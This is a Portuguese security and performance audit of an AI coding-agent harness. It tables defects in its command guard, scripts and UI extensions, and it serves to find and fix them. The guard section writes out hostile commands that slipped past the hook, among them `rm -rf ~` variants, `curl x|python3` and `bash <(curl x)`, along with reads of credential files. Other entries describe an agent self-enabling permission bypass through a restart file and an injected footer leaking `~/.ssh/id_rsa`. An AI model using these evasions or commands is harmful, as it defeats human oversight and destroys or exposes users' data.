# 01 — Gaps, bugs, logs, testes e atualidade (auditoria 2026-11-19)

Documento de análise. Fontes: `faixas/{seguranca,extensoes-nao-visuais,extensoes-ui,logs,testes,perf-confiabilidade,
atualidade}.md` (relatórios brutos, leitura estática; nenhuma suíte rodou). O repositório não tem índice codegraph:
a cobertura é degradada (`rg`/leitura). Registro e aceitação: `README.md` (AC1: cada defeito traz `arquivo:linha`,
falha concreta e correção mínima). Correções em curso: `02-seguranca-performance.md` (unidades U1–U4).

Legenda. Evidência: `reproduzido` = a faixa executou a reprodução; `hipótese` = só leitura de código; `medido` =
número obtido por medição local (carga 7–10 em 24 threads, salvo nota). Estado (atualizado em 2026-11-19 pela execução
de `07-execucao-01.md`, que supera o limite inicial a segurança e performance): `corrigido (Ux)` = unidades de `02`;
`corrigido (07: …)` = unidade de `07`, com teste vermelho → verde no bloco de evidência; `não reproduz` = evidência no
`07`.
Severidade: alta, média, baixa (a das faixas; a de segurança calibrada com bypass ligado: "ask" vira allow).

## Resumo

90 defeitos distintos (um por causa; achados vistos por duas faixas viram uma linha): **9 alta, 32 média, 49 baixa**.
Por categoria: performance 26, segurança 17, robustez/confiabilidade 21, bug 13, observabilidade 4, comportamento de
agente 4, vazamento 3, plataforma 1, a11y 1. Estado: 88 corrigidos (25 em U1–U4, 63 em `07`), 2 não reproduzem (L5,
L11).
Áreas: guard 12, scripts 9, fluxo 24, UI 26, bench 7, git 1, logs 11.
Os 10 mais graves: G1–G6 (todas alta: o guard deixa passar `rm -rf`, escrita em disco e force push por indireção,
wrappers, heredoc entre aspas, opção longa abreviada, `/dev` sem normalização; ambiente com bypass: só o DENY barra);
U1 (rótulo de fence longo derruba o processo do pi); U2 (cache de realce inexistente: lexer e `hljs` refeitos a 30 fps);
U3 (stream expulsa blocos e o botão copiar falha); G7 (leitura de `.env.*`, `~/.aws`, `local.env` etc. não negada).
Logs: nenhum bloqueio externo domina; 101 ENOENT de `$CLAUDE_CONFIG_DIR` e 75 recusas de timeout > 1800 s são do
harness (L1, L2); 429, cota e rede são externos. Testes: o CI não roda ~70 arquivos e não mede TypeScript.

## Defeitos

Um defeito visto por duas faixas é uma linha com as duas fontes (`seg` = seguranca, `nv` = extensoes-nao-visuais,
`ui` = extensoes-ui, `pc` = perf-confiabilidade, `log` = logs; o número é o do achado na faixa).

### Guard e permissões

| id | sev | categoria | arquivo:linha | falha concreta | correção mínima | evidência | estado |
|---|---|---|---|---|---|---|---|
| G1 | alta | segurança | `claude-home/hooks/guard.py:140-178`, `:181-260`, `:384-398` | Parser por argv de um segmento, sem expansão nem recursão: `bash -c 'rm -rf ~'`, `eval`, `(…)`, `{…}`, `$(…)`, `if…fi`, `rm${IFS}-rf${IFS}~`, `X=rm; $X -rf ~`, `busybox rm`, `find ~ -delete`, `find / -exec rm -rf`, `xargs rm -rf`, `ionice`, `setsid`, `base64 -d\|sh`, `curl x\|python3`, `bash <(curl x)`, `sh -c "$(curl x)"`, `curl -o x URL && sh x` e `git -c alias.x='push -f' x origin main` dão allow (seg 1) | ask (ou deny sob bypass) para `-c`/`eval`/`$(`/crase/`(`/`{`/palavra-chave/`$VAR` na posição do comando/`xargs`/`find -exec` perigosos | reproduzido | corrigido (U1) |
| G2 | alta | segurança | `guard.py:140-178` (`strip_prefixes`) | Pula as flags dos wrappers mas não os valores: `nice -n 10 rm -rf ~`, `env -u FOO rm -rf ~`, `timeout -s KILL 5 rm -rf ~` dão allow (seg 2) | Consumir o valor de cada opção por wrapper (`-n -u -s -C -S`) ou falhar fechado | reproduzido | corrigido (U1) |
| G3 | alta | segurança | `guard.py:347-367` (`HEREDOC_RE`, `mask_heredocs`) | Mascara `<<EOF` dentro de aspas: `echo '<<EOF'\nrm -rf ~\nEOF` mascara o `rm`, que o shell executa → allow (seg 3) | Mascarar só `<<` fora de aspas, com o scanner de aspas do shell | reproduzido | corrigido (U1) |
| G4 | alta | segurança | `guard.py:202-208` | `rm` compara flags por igualdade exata; o GNU rm aceita prefixo único: `rm --recurs --forc ~/x`, `rm --rec --for ~/x` → allow (seg 4) | Casar por prefixo (≥ 3 letras), como `shell.py` faz com `GNU_LONG` | reproduzido | corrigido (U1) |
| G5 | alta | segurança | `guard.py:288-305` (`check_git`) | Deny de force push a main compara o alvo literal: `git push origin HEAD:refs/heads/main -f`, `--force-with-lease origin HEAD:main`, `+refs/heads/x:refs/heads/main`, `--force` com branch atual main, `--mirror` dão só ask (allow sob bypass) (seg 5) | `removeprefix("refs/heads/")`; tratar `--force-with-lease*`/`--force-if-includes` como force; negar push forçado sem refspec | reproduzido | corrigido (U1) |
| G6 | alta | segurança | `guard.py:65-66`, `:189-192`, `:223-224` | Regex de dispositivo sem normalização: `> /dev//sda`, `> /dev/./sda`, `> /dev/sr0`, `> /dev/mem`, `> /dev/vg0/root`, `dd of=/dev/shm/../sda` → allow (seg 6) | `normpath` do alvo; negar `/dev/*` fora de `null\|zero\|stdout\|stderr\|tty\|fd/*\|shm/*` | reproduzido | corrigido (U1) |
| G7 | média | segurança | `guard.py:96-107`, `:445-458` (`check_read`); `shell.py` reusa a lista | Leitura negada só cobre `.env`, `.env.local`, `.env.production`, `.env.*.local`: `.env.staging`, `.env.development`, `~/.aws/credentials`, `~/.netrc`, `~/.git-credentials`, `~/.gnupg/*`, `~/.config/gh/hosts.yml`, `/proc/self/environ`, `~/.pi/agent/local.env` → allow (também no modo default via `cat`). `check_read` usa `abspath`, sem symlink (seg 7) | `\.env(\..+)?` exceto `.example\|.sample\|.template\|.dist`; somar as demais; `realpath` em `check_read` | reproduzido (lista); hipótese (symlink: trace de código) | corrigido (U1 + 07: C; Read nega `.env.*`, bash só nos modos) |
| G8 | média | segurança | `claude-home/settings.json.example:9` (matcher `Bash\|Edit\|Write\|Read`) | `Grep`/find/ls não passam pelo hook: `Grep` com `path=~/.pi/agent` e padrão `KEY` devolve linhas de `.env`/`auth.json` ao contexto, anulando o deny de `Read` (seg 8) | Incluir `Grep\|Glob\|Find\|Ls` no matcher e aplicar `check_read` ao `path` | reproduzido (decisão do guard; o matcher está no JSON) | corrigido (U1) |
| G9 | baixa | segurança (disponibilidade) | `guard.py:73` (`FORK_BOMB_RE`) | Regex quadrática: argumento de 40 KB sem `()` leva ~6,5 s (20 KB: 1,5 s), acima do timeout de 5 s do hook; o pi-code trata `timedOut` como bloqueio (`decisions.ts:207`), logo só DoS de uma tool call (seg 16) | Limitar o tamanho antes do regex ou ancorá-lo | reproduzido (`check_bash("a"*40000+" rm -rf /tmp/x")`) | corrigido (U1) |
| G10 | baixa | confiabilidade | `guard.py:347` (`HEREDOC_RE`) | Quadrático com heredocs sem terminador: 1.500 em 20 KB = 608 ms; heredoc real de 100 KB custa 44 ms; só comando adversarial chega perto de 5 s (pc 20) | Limitar o tamanho varrido pelo regex | reproduzido (medido) | corrigido (U1) |
| G11 | média | performance | `guard.py:51-52,437,500,511` | `tempfile` e `traceback` importados no topo; só servem a `/tmp` (`:437`) e ao caminho de erro → ~11 ms por chamada Bash/Edit/Write/Read: 26,2 → 14,9 ms (−43 %) (pc 1) | Importar `tempfile` na função de `:437` e `traceback` nos `except` | medido (cópia em `/tmp/gl`) | corrigido (U1) |
| G12 | média | performance | `claude-home/hooks/dispatch/hook-dispatch.sh:24-25,214` | PostToolUse faz `jq tostring` do `tool_response` inteiro e `grep -Eqi` com alternação grande: 77,6 ms com 1 MB e 400,6 ms com 5 MB em toda chamada MCP com páginas grandes (pc 2) | Varrer só os 64 KB iniciais e finais (`.[:65536]`); reduz a cobertura da varredura de injeção: decisão do dono | medido; hipótese de que o pi trunque antes do hook | corrigido (07: C; saída > 128 KB sempre avisa) |

### Scripts e wrapper

| id | sev | categoria | arquivo:linha | falha concreta | correção mínima | evidência | estado |
|---|---|---|---|---|---|---|---|
| S1 | média | segurança | `claude-home/bin/lifecycle/supervisor.sh:26-41`, `:91` | Pedido de `/restart` (`$PI_RESTART_REQUEST_FILE`, 0600, mesmo uid do agente) carrega `bypass`/`eligible`/`optin`; `[ "$b" = 1 ] && [ "$e" != 1 ] && [ "$o" != 1 ]` aceita `bypass:1,optin:1` mesmo em `pi --safe`: o agente escreve o JSON, o usuário sai com status 0 e a sessão reabre com `PI_BYPASS_PERMISSIONS=1` (seg 10) | Ignorar `optin` do arquivo (usar o estado do lançamento original, como já faz com `elig`) ou assinar com HMAC do processo pai | hipótese (criar o arquivo violaria a restrição da faixa) | corrigido (07: C) |
| S2 | baixa | segurança | `bin/pi:177` | `case " $* " in *" -a "*)` casa `-a` em qualquer palavra do prompt: `set -- -p "use -a flag"` → "APPROVE-matched"; o wrapper deixa de prefixar `--no-approve` e o pi carrega `.claude`/AGENTS/hooks do projeto sem confiança (seg 11) | `for a; do case $a in --approve\|-a)` sobre os argumentos antes do primeiro `--` | reproduzido | corrigido (U4) |
| S3 | média | performance | `bin/pi:206-224` | Todo lançamento copia o diretório de extensões do pi-code e aplica 65 patches em reverso só para confirmar que já estão aplicados: ~60,1 ± 6,8 ms (pc 3) | Carimbo (versão do pi-code + mtime do diretório de patches); pular a prova se igual | medido (réplica em `/tmp`) | corrigido (U4) |
| S4 | média | performance | `bin/pi:303-378` | ~12 `grep`/`cmp` sobre 85 chunks (9,5 MB) por lançamento, um por patch do core: 283 ± 99 ms (faixa 125–404 ms; mais com cache frio) (pc 4) | Mesmo carimbo de S3, chaveado por `current-version` + mtime de `dist/` | medido (ruidoso sob carga) | corrigido (U4) |
| S5 | baixa | segurança | `mcp.json.example:3-18`, `:47-52` | `npx -y @perplexity-ai/mcp-server`, `@brave/brave-search-mcp-server` e `@playwright/mcp@latest` sem versão nem integridade, com `PERPLEXITY_API_KEY`/`BRAVE_API_KEY` no `env`: versão maliciosa publicada executa com as chaves (seg 14; atualidade b.10) | Fixar versão exata (perplexity 1.3.0, brave 2.1.5, playwright 0.0.86 na data da faixa), idealmente com lockfile/hash | hipótese | corrigido (07: C) |
| S6 | baixa | segurança | `bin/pi:96-107`, `:160-250` | Patches de pi-code/pi-core aplicados por igualdade de string de versão, sem hash do alvo nem dos `.patch`/`apply.mjs`: com `node_modules` gravável, pacote adulterado na mesma versão aplica em silêncio (seg 15) | Checar sha256 do alvo/patch esperado antes de aplicar | hipótese | corrigido (07: C; manifesto fora do publish, checagem desligada no live) |
| S7 | baixa | confiabilidade | `claude-home/plugins/claude-hud/pi-transcripts/` (escrito por `claude-hud-pi-transcript.mjs:84`) | Sem rotação nem poda: 3.352 arquivos, 80 MB; maior cópia 10,5 MB; nada no repositório os apaga (pc 11) | Apagar cópias sem sessão-fonte ou com mais de 14 dias na 1ª sincronização | medido (`find`); hipótese (inexistência de poda: `rg`) | corrigido (07: C) |
| S8 | baixa | confiabilidade | `extensions/diagnostico/index.ts:240,490`; `bin/pi:136` | `inbox-$$.tsv` por lançamento (34 arquivos, 9,4 MB em `~/.pi/agent/diag`; log: 29 arquivos, 26 com PID morto, o mais antigo de 11-14); a poda de 7 dias só roda em sessão interativa (`if (!ui) return` antes de `:490`), então `pi -p` e bench nunca podam (pc 16; log 9) | Podar também no caminho headless ou o wrapper apagar `inbox-*.tsv` > 7 dias | medido (contagens); hipótese (causa) | corrigido (07: A2) |
| S9 | baixa | confiabilidade | `claude-home/bin/puxar/puxar.py:379-384` | Temporário `.<alvo>.tmp` de nome fixo, não removido se a escrita falha; duas execuções para a mesma sessão pisam no mesmo temporário (pc 19) | `NamedTemporaryFile(dir=…, delete=False)` e `unlink` em `except` | hipótese | corrigido (07: C) |

### Extensões de fluxo

| id | sev | categoria | arquivo:linha | falha concreta | correção mínima | evidência | estado |
|---|---|---|---|---|---|---|---|
| F1 | média | bug | `extensions/auto-resume/index.ts:149`, `:183` | O contador `prior` volta até a última resposta do assistente sem erro e ignora mensagens do usuário: após 5 retomadas esgotadas, prompt novo que falhe com 503 cai em `give_up` sem tentativa (`old+user+err` → `give_up`); idem `LIMIT_WAITS` (nv) | Parar o laço também em `message` com `role==='user'` | reproduzido | corrigido (07: A1) |
| F2 | média | robustez | `extensions/compact-at-400k.ts:38`, `:51`, `:119` | `PI_COMPACT_AT=""` dá 0 e valor não numérico dá NaN; `tokens < LIMIT` é falso → compacta a cada `agent_settled`; `session_start` grava NaN em `LIMIT`; `PI_COMPACT_SUMMARY_MAX` inválido faz `prev.length <= NaN` falso e condensa sempre (nv) | `Number.isFinite(n) && n > 0`, senão o padrão | reproduzido (`Number("")`, `Number("abc")`) | corrigido (07: A1) |
| F3 | baixa | robustez | `compact-at-400k.ts:120-124` | `running = true` antes do `new Promise`: se `ctx.compact` lança de forma síncrona (ctx obsoleto), `running` fica `true` e a sessão nunca mais compacta (nv) | `try/finally` que zera `running` | hipótese | corrigido (07: A1) |
| F4 | média | vazamento | `extensions/syntax-check/index.ts:52-54` | `new ts.Parser()` e a árvore de `parse()` nunca recebem `.delete()`: cada edição/escrita em arquivo suportado vaza heap wasm (até 2× se já havia erro); crescimento não medido (nv) | `try { … } finally { tree?.delete(); parser.delete() }` | hipótese | corrigido (07: A1) |
| F5 | média | robustez | `extensions/claude-compat/vim/engine.ts:51`, `:199` | `num()` aceita qualquer nº de dígitos e `leaveInsert` faz `repeatIns × capture.length` chamadas a `host.send` sem `guard(MAX_OPS)`: `99999999i abc<Esc>` trava a UI; o replay do `.` (~`:496`) idem (nv) | Limitar a contagem (ex.: 9999) ou passar o total por `guard` | hipótese | corrigido (07: A1) |
| F6 | baixa | bug | `extensions/plan-gate.ts:129` | `review.at >= lastEdit` aceita `complete` quando a edição e a chamada ao `plan-reviewer` vêm na mesma mensagem (paralelas); a edição rodou durante a revisão (nv) | Trocar por `>` | reproduzido (`allow review_complete`) | corrigido (07: A1) |
| F7 | média | segurança | `extensions/bash-clamp/index.ts:25`, `:68-78` | `FOOTER_RE` aceita o rodapé `[Showing … Full output: <path>]` vindo do TEXTO da saída; a extensão faz `statSync`/`readHead` (64 KB) e injeta 50 linhas: conteúdo injetado com `Full output: ~/.ssh/id_rsa` põe a chave no contexto sem passar pelo guard de `Read` (seg 9) | Aceitar `piPath` só sob o diretório de spill do pi (`realpath` em `tmpdir()/pi-*`) e do mesmo uid | reproduzido (com `/etc/services`) | corrigido (U2) |
| F8 | baixa | segurança | `bash-clamp/index.ts:28-45` | `join(tmpdir(),'pi-bash-clamp')` com `mkdirSync(recursive,0700)` (não corrige dono/modo de diretório existente) e `writeFileSync` sem `wx` segue symlinks plantados em `<toolCallId>.log`; só multiusuário local (seg 13) | `lstat` do diretório (dono e modo) e `flag:'wx'` | hipótese | corrigido (U2) |
| F9 | baixa | vazamento | `bash-clamp/index.ts:22-36` | `MAX_LOGS=50` vale para o diretório compartilhado `/tmp/pi-bash-clamp` (todas as sessões e subagentes): `prune` apaga logs de sessões vivas e o `read` do caminho citado no rodapé dá ENOENT (nv) | Prune por idade (ex.: > 24 h) ou diretório por pid | hipótese | corrigido (U2) |
| F10 | baixa | segurança | `extensions/image-open/index.ts:19-33` | `/tmp/pi-images-<uid>` previsível: `mkdirSync` não falha se outro usuário o criou e `chmodSync` lança EPERM (DoS do clique); sendo dono o atacante, `existsSync(file)` reaproveita arquivo de mesmo hash plantado e `xdg-open` o abre; só multiusuário (seg 12) | `mkdtempSync` ou `lstat` (dono/modo); `wx` em vez de `existsSync`+`writeFileSync` | hipótese | corrigido (U2) |
| F11 | baixa | performance | `image-open/index.ts:23` | `writeTemp` no clique, no laço principal: `trim()` copia até 70 MB, regex `^[A-Za-z0-9+/]+={0,2}$`, `Buffer.from`, sha256 e `writeFileSync` síncronos: imagem de 50 MB trava o TUI por centenas de ms (ui) | Cachear caminho por `base64Data` (WeakMap) e gravar de forma assíncrona | hipótese | corrigido (07: A1) |
| F12 | baixa | performance | `extensions/diagnostico/registro.ts:116` (`lerCaixa`), chamado em `diagnostico/index.ts` (`tool_execution_end`, `turn_end`, `agent_settled`) | Cada chamada relê a caixa inteira (`readFileSync`) para usar só `subarray(offset)`; a caixa cresce sem limite na sessão e só é podada aos 7 dias (nv) | Ler do `offset` com `openSync`/`readSync` ou comparar `statSync().size` | hipótese | corrigido (U2) |
| F13 | baixa | segurança | `diagnostico/registro.ts:50` | `appendFileSync(diag.jsonl)` sem `mode`: arquivo `-rw-rw-r--` e diretório `drwxrwxr-x`, enquanto `traces.jsonl` usa `0o600` (`exportar.ts:107`); guarda mensagens e erros (já redigidos) legíveis pelo grupo (nv) | `{ mode: 0o600 }` e diretório `0o700` | observado (modos reais) | corrigido (U2) |
| F14 | baixa | confiabilidade | `diagnostico/registro.ts:45-47`, `diagnostico/exportar.ts:104-106` | Rotação `statSync` + `renameSync` para `.1` sem coordenação: dois pi veem `> maxBytes` juntos e o segundo renomeia o arquivo novo e pequeno sobre o `.1`, apagando ~1 MB; só 1 geração (`diag.jsonl.1` 1,0 MB; `traces.jsonl.1` 5,3 MB) (pc 15; log 8: histórico some em ~3 dias, `registro.ts:30,47`) | Renomear só se o `.1` for mais antigo, ou `.1`/`.2` datados | hipótese (retenção: observada nos logs) | corrigido (07: A2) |
| F15 | média | performance (resiliência) | `extensions/auto-resume/index.ts:34`, `:312-336` | `DELAYS_MS` fixos (30 s, 90 s, 3, 5, 10 min) sem jitter; cada subagente filho (`PI_CODE_SUBAGENT`) também retoma: N lanças que falham juntas (queda 503 de 13/11) voltam no mesmo instante (pc 14) | Jitter ±20 % em `delayMs` | hipótese | corrigido (07: A1) |
| F16 | baixa | performance | `auto-resume/index.ts:294` | `hudCache()` faz `readFileSync` + `JSON.parse` de `usage-cache.json` em todo `agent_before_settle`, inclusive com decisão `none` (nv) | Calcular `resetAt` só depois de `decideResume` indicar `resume` por limite | hipótese | corrigido (07: A1) |
| F17 | baixa | performance | `extensions/cache-prefix-probe/index.ts:17-18` | Em toda requisição, para o histórico inteiro: `JSON.stringify`+`parse`+`stringify`+sha1 por mensagem, síncrono (~1 MB × 3 passadas com 250k tokens); o `.jsonl` diário cresce sem teto (3,7 MB em `~/.cache/pi-cache-probe`); a extensão se declara temporária (nv) | Remover a sonda (passo 6 do plano) ou hash só das mensagens novas | hipótese; tamanho do arquivo medido | corrigido (07: A1) |
| F18 | baixa | robustez | `extensions/no-context-files-covers-claude-md.ts:48` | `readFileSync` sem try no laço de agentes: `.md` ilegível ou symlink quebrado em `~/.claude/agents` ou `~/.pi/agent/agents` lança na fábrica e o filho `omitClaudeMd` não omite o CLAUDE.md (nv) | `try/continue` | hipótese | corrigido (07: A1) |
| F19 | baixa | robustez | `extensions/comandos/paleta.ts:37` (e `lerEstado` `:18`) | Leitura-modifica-escreve não atômica de `ui-state.json` (que `editor.ts` também grava): com duas sessões ou leitura durante `writeFileSync` truncado, `lerEstado` devolve `{}` e o gravar apaga as outras chaves (nv) | Gravar via tmp + `renameSync`, como `avisos/config.ts:gravar` | hipótese | corrigido (07: A1) |
| F20 | baixa | performance | `extensions/comandos/index.ts:20` | O provider de autocomplete chama `lerRecentes()` (`readFileSync` + `JSON.parse`) a cada tecla depois do `/` (nv) | Memoizar por `mtime` ou ler uma vez por abertura do menu | hipótese | corrigido (07: A1) |
| F21 | baixa | robustez | `extensions/diagnostico/doctor.ts:93` | `json(d,f)` lança em `settings.json` inválido; o `try` de `verificar` envolve o check `hooks` inteiro, então o 2º arquivo de `fontes` não é verificado e vira um achado genérico "verificação hooks falhou" (nv) | `try/catch` por arquivo no laço | hipótese | corrigido (07: A2) |
| F22 | baixa | bug | `extensions/bash-timeout/index.ts:44` | Em sessão principal, `SLEEP` casa `sleep N` mesmo com `&` no fim ou em `( … ) &`: `(sleep 90 && cmd) &` é bloqueado embora não prenda o turno (nv) | Ignorar `sleep` em segundo plano ou documentar a limitação | hipótese | corrigido (07: A1) |
| F23 | baixa | plataforma | `extensions/claude-compat/background/record.ts:43` | `procStat` lê `/proc/<pid>/stat` (só Linux): no macOS `birth()` devolve `undefined` e `/background`/`updateIdentity` falham sempre com "birth da raiz ilegível", sem dizer que a causa é a plataforma (nv) | Detectar `process.platform !== 'linux'` com mensagem própria, ou `ps -o lstart=` | hipótese | corrigido (07: A1) |
| F24 | baixa | confiabilidade | `extensions/plan-gate.ts:219-232` | Com plano aprovado, cada `agent_before_settle` grava entrada `custom` `plan-gate` mesmo em `allowed`: a sessão cresce uma entrada por parada (para após `completed`, `:140`) (pc 17) | Não gravar se `state` e `why` forem iguais à última entrada | hipótese | corrigido (07: A1) |

### Extensões de UI e statusline

| id | sev | categoria | arquivo:linha | falha concreta | correção mínima | evidência | estado |
|---|---|---|---|---|---|---|---|
| U1 | alta | bug (disponibilidade) | `extensions/code-blocks/blocks.ts:171` (via `index.ts:112`) | Fence com info-string longa sem espaço (` ```typescript:src/…/Foo.tsx `): `lang` vira rótulo sem truncar, `gap = max(1, …)` deixa o cabeçalho mais largo que `width` e o pi-tui lança "Rendered line exceeds terminal width" (`tui-main-screen.js:485`), encerrando o processo; passa de 45 colunas de rótulo em 60 colunas (ui) | `truncateToWidth(lang, inner - visibleWidth(button) - 1)` antes de montar a linha | hipótese de gatilho; o lançamento do pi-tui foi confirmado no código instalado | corrigido (U3) |
| U2 | alta | performance | `code-blocks/index.ts:79`, `:93` | `md.blockHighlightedCode?.get/set` não existe no pi-tui instalado (confirmado, `pi-coding-agent` 1.1.0): o cache de realce nunca age; qualquer delta de texto ou tick de 30 fps do `suavizar` refaz lexer e `hljs.highlight` de todos os blocos, inclusive fechados: O(blocos·linhas) por tick, sem teto de bloco (ui) | `Map` local (chave grammar+texto, teto ~200) e não realçar blocos > ~2000 linhas | observado (ausência da API); custo por leitura | corrigido (U3) |
| U3 | alta | bug | `code-blocks/index.ts:28` | `remember(token.text)` roda a cada render; durante o stream cada prefixo vira entrada (`blockId` muda): em ~17 s (30 ticks/s) `MAX_BLOCKS=500` é atingido, expulsa blocos antigos e o clique em "⧉ copiar" responde "Bloco não está mais em memória"; memória O(n²) (ui) | Chamar `remember` só com bloco fechado (`next !== undefined`), ou substituir a entrada do mesmo bloco por posição | hipótese (por leitura) | corrigido (U3) |
| U4 | média | performance | `extensions/sticky-prompt/sticky.ts:19` (chamado em `index.ts:17`) | `opts.visible` roda a cada quadro; sem cache, `findSticky` caminha de `scrollTop` para trás com regex por linha; em cada `ZONE_START` o laço interno faz `strip`+`trim` até `ZONE_END` (até o fim do transcript em zona em stream): O(linhas × zonas) por frame (ui) | Memoizar por `(scrollContentLines, scrollTop)` e indexar zonas uma vez por mudança de array | hipótese | corrigido (U3) |
| U5 | média | performance | `extensions/ui-visual/tools.ts:356`, `ui-visual/diff.ts:199` | `diffComponent` usa `w` na chave do memo; `renderDiff` refaz parse, LCS de palavras e `highlightCode` a cada largura: arrastar a janela re-realça todos os diffs de `edit` do histórico (ui) | `WeakMap` por string do diff com entradas parseadas e realçadas; só `fit`/`pad` dependem da largura | hipótese | corrigido (07: B) |
| U6 | média | bug | `ui-visual/compact.ts:60`, `:102` × `extensions/chat-margin/inset.ts:92` | `attach` devolve false se `chat.render` já é própria, mas o widget faz `done = true`; o `hookContainer` do chat-margin grava `c.render` no mesmo contêiner (`doc.children[2]`): na ordem alfabética de carga a compactação das tools seguidas nunca instala; na inversa o chat-margin sobrescreve o embrulho (ui) | `done` só se `attach` devolveu true; chat-margin encadeia o `render` existente em vez de `proto.render` | hipótese (não executada; não confirmado que `doc.children[2]` e `findChat` são o mesmo contêiner) | corrigido (07: B) |
| U7 | média | performance | `extensions/ui/editor.ts:186` (getter `borderColor`), `:367` (`respiro`) | O getter roda ≥ 3× por frame, cada uma com `getText()` (join de todas as linhas) em `shellLabel`, `busy()`, `anima()`, 2× `getFgAnsi`+regex e `performance.now`: colagem de 100 KB = ~6 joins de 100 KB por frame a 30 fps com o agente ocupado (ui) | `shellLabel` e `respiro()` uma vez por `render()` | hipótese | corrigido (07: B) |
| U8 | média | performance | `ui-visual/compact.ts:25` | `compactRender` reescreve o chat inteiro a cada frame (`layout.push` com objeto novo por filho, `rows.slice(1)` por tool, `push` por linha): O(linhas do histórico) por quadro de animação (ui) | Reaproveitar se os filhos devolvem as mesmas referências; montar `layout` só quando a largura muda | hipótese | corrigido (07: B) |
| U9 | média | performance | `chat-margin/inset.ts:92` | `hookContainer.render` percorre todos os filhos a cada frame; para filhos não "soltos", `isLoose` roda `instanceof`, `getPrototypeOf` e `constructor.name` a cada frame porque só os embrulhados são marcados: O(n) por frame (ui) | `WeakSet` de vistos; `onChild` só para filhos novos | hipótese | corrigido (07: B) |
| U10 | média | performance | `ui-visual/motion/marcas.ts:68`, `:100` | `ligarCaminhos` roda a cada render do Markdown do assistente (tick do suavizador): regex `CAMINHO` varre a mensagem toda, `statSync` síncrono para caminhos novos (cache de 500) e `hostname()` por link; stream longo com muitos caminhos bloqueia o laço (ui) | Memoizar por `md` (último texto entrada→saída); `hostname()` uma vez | hipótese | corrigido (07: B) |
| U11 | baixa | bug | `marcas.ts:68` | `existe` também guarda `false`: caminho citado antes de o arquivo existir (ex.: criado por `write` logo depois) nunca vira link até o mapa passar de 500 e ser limpo (ui) | Não cachear `false` ou TTL de poucos segundos | hipótese | corrigido (07: B) |
| U12 | baixa | bug | `ui-visual/index.ts:56-66` | `vistas` chaveado só pelo texto: a 2ª mensagem viva idêntica a uma anterior ("continue", "sim") herda a hora da 1ª e não recebe o brilho; ao chegar a 200 entradas `clear()` faz mensagens antigas ao vivo reganharem `Date.now()` e reanimarem o brilho no próximo re-render (ui) | Chavear por identidade da mensagem; LRU em vez de `clear` | hipótese | corrigido (07: B) |
| U13 | baixa | performance | `ui-visual/index.ts:58`, `:66` | O transformer do usuário roda `afinarMensagem(tuiAtual(), md)` (DFS profundidade 6) e `new Date(t).toLocaleTimeString(…)` (medido 25 µs/chamada; 2000 chamadas = 49 ms contra 1 ms com `Intl` compartilhado) a cada render de cada mensagem (ui) | Um `Intl.DateTimeFormat` único (como `HORA_FMT` em `tools.ts:135`); marcar mensagens afinadas | medido (formatação) | corrigido (07: B) |
| U14 | baixa | performance | `ui-visual/tools.ts:156` (`horaDe`) | Varre `historico()` inteiro (`getBranch`) por chamada de ferramenta na 1ª pintura (resume, `/reload`): O(ferramentas × entradas), ~10⁷ comparações com 5000 entradas e 2000 ferramentas, mais cópia do ramo (ui; o memo de `horaDe` de `docs/perf-sota.md` já existe, este é o custo de montar a hora) | `Map<toolCallId, timestamp>` montado uma vez e invalidado em `session_start` | hipótese (estimativa); linha 156 conferida no código | corrigido (07: B) |
| U15 | baixa | vazamento | `ui-visual/motion/vivo.ts:13` | `inicio` só limpa em `terminou`: sem `tool_execution_end` (reload, troca de sessão no meio), `rodando(id)` fica true, o cartão redesenha a 30 fps enquanto visível e o mapa cresce sem teto (ui) | Limpar `inicio` em `session_start`/`session_shutdown` e podar entradas antigas | hipótese (depende de o pi sempre emitir o fim) | corrigido (07: B) |
| U16 | baixa | bug | `ui-visual/icons.ts:187` | `largura()` conta code points, não colunas (o comentário admite): mensagem com CJK ou emoji largo calcula `gap` curto, a hora estoura a 1ª linha e o Markdown quebra (ui) | `visibleWidth` do pi-tui; cortar `corte` por colunas | hipótese | corrigido (07: B) |
| U17 | baixa | bug | `claude-home/bin/hud/calm-statusline.mjs:39` | `width()` conta code points; `head` nunca é truncada e o fallback `tries.at(-1)` pode passar de `columns` (branch/dir/modelo longos, terminal < 60 colunas) (ui) | Largura real (tabela do pi-tui) e truncar `head` e o último fallback a `columns` | hipótese (comportamento do pi com linha excedente) | corrigido (07: C) |
| U18 | média | performance | `calm-statusline.mjs:60` (`gitState`) | `execFileSync` de `git status --porcelain -b` a cada execução, sem cache: em repo grande ou NFS bloqueia até 400 ms e, no timeout, devolve `undefined` (a branch some de forma intermitente); aqui leva 0,00 s, pior caso não medido (ui) | Cache `{cwd, branch, dirty}` em arquivo por 5–10 s; no timeout reusar o último valor | hipótese | corrigido (07: C) |
| U19 | média | performance | `claude-home/bin/hud/claude-hud-provider.mjs:10` | Sem `model.provider` no payload (patch pendente), `lastModelChange` lê até 8 MB, converte e faz `split('\n')` (43 ms medidos para 8 MB) a cada execução (ui) | Ler de trás para frente em blocos de 64 KB até o 1º `model_change` | medido | corrigido (07: C) |
| U20 | média | confiabilidade | `claude-home/bin/hud/claude-hud-pi-transcript.mjs:132-173` (`syncTranscript`) | Sem lock nem escrita atômica: duas execuções concorrentes (refresh de 60 s + por mensagem) leem o mesmo `offset`, ambas fazem `appendFileSync` do mesmo trecho e depois gravam o estado; morrer entre o append (`:171`) e o `writeFileSync` do estado (`:173`) também duplica; `state.json` pela metade vira reset completo → linhas de transcript duplicadas (ui 'syncTranscript :133'; pc 10) | Gravar o estado em `tmp`+`rename`/antes do append e travar com `O_EXCL`/`flock` | hipótese (depende de o pi sobrepor execuções) | corrigido (07: C) |
| U21 | baixa | bug | `calm-statusline.mjs:106` (`ctxHistory`) | Mesmo `${file}.tmp` para todas as sessões: duas sessões simultâneas se sobrescrevem ou falham no `rename`; o erro é engolido e o histórico perde pontos (ui) | `${file}.${process.pid}.tmp`, como `claude-hud-usage.mjs` | hipótese | corrigido (07: C) |
| U22 | baixa | performance | `claude-home/bin/hud/claude-hud-usage.mjs:135` | Com o cache de 60 s vencido a statusline espera o `fetch` até 3 s; sem rede, para uma vez por minuto; várias sessões renovam juntas, sem lock (ui) | Servir o vencido de imediato e renovar em processo separado | hipótese | corrigido (07: C) |
| U23 | baixa | performance | `ui-visual/diff.ts:225` | `Math.max(NUM_MIN, ...entries.map(…))` com spread: diffs acima de ~120 mil linhas lançam RangeError e `diffComponent` cai no nativo sem aviso (ui) | `reduce` | hipótese | corrigido (07: B) |
